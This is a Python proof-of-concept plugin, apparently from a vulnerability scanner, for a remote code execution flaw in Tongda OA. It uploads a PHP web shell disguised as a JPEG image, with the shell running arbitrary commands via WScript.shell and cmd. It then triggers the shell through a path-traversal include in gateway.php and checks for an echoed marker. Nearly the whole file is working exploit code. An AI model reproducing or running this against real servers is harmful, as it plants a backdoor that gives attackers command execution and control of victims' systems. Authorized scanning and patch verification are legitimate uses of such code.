#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
descr: https://www.anquanke.com/post/id/201174
refer: https://github.com/fuhei/tongda_rce
"""


from lib.core.Request import request
import re
from plugin.target_parse import get_standard_url


def poc(url):
    try:
        url1 = get_standard_url(url) + '/ispirit/im/upload.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
        data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
        result = request.post(url1, headers=headers, data=data, timeout=5, verify=False)

        name = "".join(re.findall("2003_(.+?)\|", result.text))
        url2 = get_standard_url(url) + '/ispirit/interface/gateway.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"}
        data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo fffhhh"}
        result = request.post(url2, headers=headers, data=data, timeout=5, verify=False)
        if result.status_code == 200 and 'fffhhh' in result.text:
            # print("[+] Remote code execution vulnerability exists at the target address")
            return get_standard_url(url)
        else:
            return False
    except:
        pass
